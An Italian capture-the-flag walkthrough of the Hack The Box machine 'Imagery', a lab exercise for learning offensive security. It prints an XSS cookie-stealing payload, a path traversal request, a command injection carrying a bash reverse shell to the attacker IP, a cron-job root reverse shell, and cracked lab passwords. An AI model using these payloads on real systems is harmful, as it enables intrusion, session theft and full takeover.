# Imagery

IP vittima: 10.10.11.88 IP attaccante: 10.10.14.27
## Recon
`sudo nmap -p- --open -sS -n -Pn -v 10.10.11.88`
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-15 15:34 CET
Initiating SYN Stealth Scan at 15:34
Scanning 10.10.11.88 [65535 ports]
Discovered open port 22/tcp on 10.10.11.88
Discovered open port 8000/tcp on 10.10.11.88
Completed SYN Stealth Scan at 15:34, 17.09s elapsed (65535 total ports)
Nmap scan report for 10.10.11.88
Host is up (0.035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.24 seconds
           Raw packets sent: 65577 (2.885MB) | Rcvd: 65535 (2.621MB)
```
`sudo nmap -sC -sV -O -p22,8000 10.10.11.88`
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-15 15:35 CET
Nmap scan report for 10.10.11.88
Host is up (0.021s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http-alt Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.1.3 Python/3.12.7
|     Date: Sat, 15 Nov 2025 14:35:34 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.3 Python/3.12.7
|     Date: Sat, 15 Nov 2025 14:35:29 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 146960
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Image Gallery</title>
|     <script src="static/tailwind.js"></script>
|     <link rel="stylesheet" href="static/fonts.css">
|     <script src="static/purify.min.js"></script>
|     <style>
|     body {
|     font-family: 'Inter', sans-serif;
|     margin: 0;
|     padding: 0;
|     box-sizing: border-box;
|     display: flex;
|     flex-direction: column;
|     min-height: 100vh;
|     position: fixed;
|     top: 0;
|     width: 100%;
|     z-index: 50;
|_    #app-con
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=11/15%Time=69188FB1%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,3027,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.
SF:3\x20Python/3\.12\.7\r\nDate:\x20Sat,\x2015\x20Nov\x202025\x2014:35:29\
SF:x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Lengt
SF:h:\x20146960\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x
SF:20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-widt
SF:h,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Image\x20Gallery</t
SF:itle>\n\x20\x20\x20\x20<script\x20src=\"static/tailwind\.js\"></script>
SF:\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"static/fonts\.c
SF:ss\">\n\x20\x20\x20\x20<script\x20src=\"static/purify\.min\.js\"></scri
SF:pt>\n\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20body\x2
SF:0{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20'In
SF:ter',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20m
SF:argin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\
SF:x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-sizing:\x20b
SF:order-box;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x2
SF:0flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20flex-direction:
SF:\x20column;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20min-height
SF::\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20nav\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20posi
SF:tion:\x20fixed;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x
SF:200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20100%;\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x2050;\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20#app-con")
SF:%r(FourOhFourRequest,184,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x
SF:20Werkzeug/3\.1\.3\x20Python/3\.12\.7\r\nDate:\x20Sat,\x2015\x20Nov\x20
SF:2025\x2014:35:34\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8
SF:\r\nContent-Length:\x20207\r\nConnection:\x20close\r\n\r\n<!doctype\x20
SF:html>\n<html\x20lang=en>\n<title>404\x20Not\x20Found</title>\n<h1>Not\x
SF:20Found</h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x
SF:20the\x20server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20
SF:please\x20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.01 seconds
```
## Sito http (porta 8000)
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115155315.png)
...
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115160006.png)
Clicchiamo su `Report Bug`:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115160101.png)
La funzione `Report Bug` è immediatamente sospetta. I moduli che accettano input da parte dell'utente e che possono essere visualizzati da un utente privilegiato (come un amministratore) sono un classico punto di accesso per lo [[Stored Cross-Site Scripting]] (XSS).
### Accesso admin tramite XSS
L'ipotesi è che un amministratore esamini periodicamente le segnalazioni di bug. Se riusciamo a inserire JavaScript nella segnalazione, questo verrà eseguito nel browser dell'amministratore, consentendoci di rubare il suo cookie di sessione.
L'obiettivo è fare in modo che il browser dell'amministratore ci invii il proprio cookie.

Creiamo uno user con `register`:
Email ID: `xerand@xerand.com`
Password: `xerand`
Poi effettuiamo il login
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115155807.png)

1) Avviamo un listener sul nostro PC sulla porta 80, ascolteremo le richieste HTTP in entrata (`sudo nc -nlvp 80` o `python3 -m http.server 80`)
2) Il payload efficace utilizza un tag <img> con un evento onerror che si attiva quando l'origine dell'immagine non è valida. `<img src=1 onerror="document.location='http://10.10.14.27/steal/'+document.cookie">` 
   - src=1: il caricamento non andrà a buon fine, attivando l'evento onerror.
   - document.location=...: reindirizza il browser dell'amministratore al nostro server in ascolto, con il cookie aggiunto all'URL.
3) Navighiamo alla pagina `Report Bug` e inviamo il nostro payload nei campi Bug Name / Summary e/o Bug Details.

In questo modo riusciamo ad ottenere la sessione dell'amministratore:
```
sudo nc -lvnp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.88 56050
GET /steal/session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRiaZQ.5ayPLKNSIn_DGbFFqP9dgrnQXaE HTTP/1.1
```
La sessione è **.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRiaZQ.5ayPLKNSIn_DGbFFqP9dgrnQXaE**

Sostituiamo la nostra sessione con quella dell'amministratore appena trovato usando, i developer tools del browser (Storage/Cookie - Archiviazione/Cookie):
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115163710.png)
Poi facciamo un refresh della pagina diventando amministratore. Ora dovremmo avere accesso all'endpoint /admin, che in precedenza era vietato.

![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115165950.png)
Ora intercettiamo con [[burpsuite]] il click su `Download Log` e sostituiamo 
`log_identifier=admin%40imagery.htb.log` 
con 
`log_identifier=../../../../../../proc/self/environ`
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115170808.png)

L’indirizzo **`/proc/self/environ`** è un file virtuale molto importante nel pentesting Linux, soprattutto quando si sfruttano vulnerabilità **LFI / RFI / log poisoning / privesc**.
È un file virtuale del filesystem **/proc** che contiene **tutte le variabili d’ambiente** del **processo corrente**.
- `/proc` = filesystem virtuale del kernel  
- `/proc/self` = link al **processo che sta leggendo il file**
- `/proc/self/environ` = variabili d’ambiente di quel processo
Il pathname `/proc/self` è un _magick link_:  
Quando un processo apre `/proc/self`, il kernel lo reindirizza automaticamente al **PID del processo stesso**.
Esempio:
- se il processo è `pid 12345`  
- `/proc/self/` == `/proc/12345/`

Otteniamo
```
LANG=en_US.UTF-8PATH=/home/web/web/env/bin:/sbin:/usr/binUSER=webLOGNAME=webHOME=/home/w
ebSHELL=/bin/bashINVOCATION_ID=9adbf2f315f548c1b50514e04639e2aa JOURNAL_STREAM=9:18794SYS
TEMD_EXEC_PID=1321MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/flaskapp.service/mem ory.pressureMEMORY_PRESSURE_WRITE=c29tZSAYMDAwMDAgMjAwMDAwMAA=CRON_BYPASS_TOKEN=K7Zg9vB$
24NmW! q8xRøp/runL!
```
Da cui:
- User:`web`
- Ambiente attuale: `/home/web/web/env/bin`
- Home:`/home/web`
- Shell:`/bin/bash`
- Monitoraggio della memoria: `flaskapp.service`(applicazione Flask)

Quindi è attiva il servizio **Flask**. In ambito **pentesting**, quando analizzi un’app Flask ci sono alcuni **file di configurazione** fondamentali che possono contenere informazioni sensibili o diventare vettori di attacco. Il primo è `config.py`.
Con [[burpsuite]]proviamo ad esaminarlo (si trova all'indirizzo `/home/web/web/`):
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115173853.png)
Troviamo `DATA_STORE_PATH = 'db.json'`. Esaminiamolo con [[burpsuite]]:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115181207.png)
Troviamo le password di `admin` e `testuser`. Quella di testuser è un hash MD5 crackabile con 
https://crackstation.net/
Troviamo la password: `iambatman`
Quindi per accedere come testuser useremo:
mail: `testuser@imagery.htb`
password: `iambatman`
### Remote Code Execution via Command Injection
Esaminando il file `app.py` presente in `/home/web/web/` scopriamo diversi file da cui l'applicazione principale importa, tra cui `api_edit.py`
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251116133153.png)
Esaminando anche questo file troviamo questa parte dello script:
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251116134205.png)

La funzione `crop` trovata rivela il Santo Graal delle vulnerabilità web.
``` python
if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```
La funzione `subprocess.run` viene chiamata con `shell=True`, eseguendo la stringa di comando tramite la shell del sistema. I parametri `x, y, width e height` vengono presi direttamente dall'input dell'utente e concatenati nella stringa di comando senza alcuna sanificazione. Si tratta di una vulnerabilità di tipo `command injection` da manuale.

Per sfruttarla loggiamo come utente testuser (mail: `testuser@imagery.htb` password: `iambatman`), poi carichiamo un'immagine tramite `Upload`, andiamo nella `Gallery` e cliccando sui 3 pallini in alto a destra dell'immagine caricata scegliamo `Trasform Image` e l'operazione `Crop`.
Intercettiamo il click su `Apply Trasformation` con [[Burpsuite]]
Mettiamoci in ascolto sulla porta 4444 (`nc -nlvp 4444`)
Sostituiamo il parametro `"x"` con **"`bash -c 'bash -i >& /dev/tcp/10.10.14.27/4444 0>&1'`"** e inviamo la richiesta
Otteniamo una shell come utente `web`
### Post-Exploitation and User Pivot
Andiamo nella cartella `/tmp/` e scarichiamo [[linpeas]]dalla nostra macchina (`python3 -m http.server 3000` nella cartella che contiene linpeas sulla nostra macchina e `wget http://10.10.14.27:3000/lipeas.sh` nella cartella `/tmp/` della macchina vittima)
Lanciamo [[linpeas]](`chmod +x linpeas.sh` e `./linpeas.sh`).
Nelle cartelle `backup` troviamo il file `web_20250806_120723.zip.aes`
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251116143817.png)
Lo scarichiamo sulla nostra macchina (`python3 -m http.server 3000` nella cartella che contiene `web_20250806_120723.zip.aes` sulla macchina vittima e `wget http://10.10.11.88:3000/web_20250806_120723.zip.aes` sulla nostra macchina)
Il file è criptato con AES-Crypt, possiamo provare a decrittarlo con questo: 
https://github.com/Nabeelcn25/dpyAesCrypt.py
Cloniamo la repository, attiviamo il venv e lanciamo lo script con:
`python3 dpyAesCrypt.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt`
Lo script troverà la password `bestfriends` e decritterà il file
unzippiamolo con `unzip web_20250806_120723`, verrà creata la cartella `web` in cui è presente il file `db.json` che contiene le credenziali dell'utente `mark`:
```
"username": "mark@imagery.htb",
"password": "01c3d2e5bdaf6134cec0a367cf53e535",
```
Cracchiamo la password con https://crackstation.net/ ottenendo la password `supersmash`
### Utente mark
Sulla macchina vittima diventiamo l'utente mark (`su mark` + password `supersmash`), nella cartella `/home/mark`
troviamo la userflag nel file `user.txt`
### Scalata dei privilegi
Con `sudo -l` troviamo scopriamo che l'utente `mark` può eseguire il file `charcol` come root senza password usando `sudo`:
```
sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```
Con `sudo charcol --help` troviamo
```
charcol --help
bash: line 11: /usr/local/bin/charcol: Permission denied
sudo charcol --help
usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only
                        warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system
                        password verification).
```
Per prima cosa resettare la password con `sudo /usr/local/bin/charcol -R` con la password di mark `supersmash`
Poi entrare nella shell con `sudo /usr/local/bin/charcol shell` (verrà richiesto di inserire di mettere una nuova password o scegliere l'utilizzo senza password e poi rientrare nuovamente nella shell)
Nella shell di charcol, con il comando `help` scopriamo che è possibile aggiungere dei [[cronjob]]
```
Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
```
Sfruttiamo questa possibilità facendo spawnare una shell con i permessi root con il comando
`auto add --schedule "* * * * *" --command "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.27/4444 0>&1'" --name "root_shell"`
Prima di lanciarlo mettiamoci in ascolto sulla porta 4444 (`nc -nlvp 4444`) poi lanciamo il comando
Dopo circa 60 secondi riceveremo la shell con permessi root.
Nella cartella `/root` troviamo la rootflag nel file `root.txt`
